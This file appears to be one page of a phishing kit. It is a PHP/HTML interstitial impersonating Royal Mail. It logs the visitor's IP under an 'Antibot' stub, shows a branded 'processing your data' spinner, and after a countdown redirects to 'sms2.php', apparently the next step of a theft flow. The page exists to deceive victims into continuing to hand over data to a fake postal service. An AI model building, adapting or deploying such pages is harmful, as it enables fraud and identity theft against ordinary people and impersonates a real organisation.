<?php
// === Antibot (optional) ===
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}
$userIP = getUserIP();

// Add antibot logic here if needed
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Royal Mail - Please Wait</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" rel="stylesheet" />
<style>
  body {
    background-color: #fff0f0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .loader-container {
    text-align: center;
    background-color: #fff;
    border: 3px solid #cc0000;
    padding: 30px 50px;
    border-radius: 20px;
    box-shadow: 0 0 20px rgba(204, 0, 0, 0.3);
    max-width: 400px;
    width: 90%;
  }
  .loader-container h3 {
    color: #cc0000;
    font-weight: 700;
    margin-bottom: 15px;
  }
  .spinner-border {
    width: 4rem;
    height: 4rem;
    border-width: 0.5rem;
    color: #cc0000;
    margin-bottom: 20px;
  }
  .redirect-text {
    font-weight: 600;
    font-size: 1.2rem;
    color: #cc0000;
  }
</style>
</head>
<body>
  <div class="loader-container" role="alert" aria-live="polite" aria-atomic="true">
    <h3><i class="fas fa-hourglass-half"></i> Please wait while we process your data</h3>
    <div class="spinner-border" role="status" aria-hidden="true"></div>
    <p class="redirect-text">Redirecting in <span id="countdown">5</span> seconds...</p>
  </div>

<script src="https://kit.fontawesome.com/00ce2dd051.js" crossorigin="anonymous"></script>
<script>
  let timeLeft = 5;
  const countdownEl = document.getElementById('countdown');
  const timer = setInterval(() => {
    timeLeft--;
    countdownEl.textContent = timeLeft;
    if(timeLeft <= 0) {
      clearInterval(timer);
      window.location.href = 'sms2.php';
    }
  }, 1000);
</script>
</body>
</html>
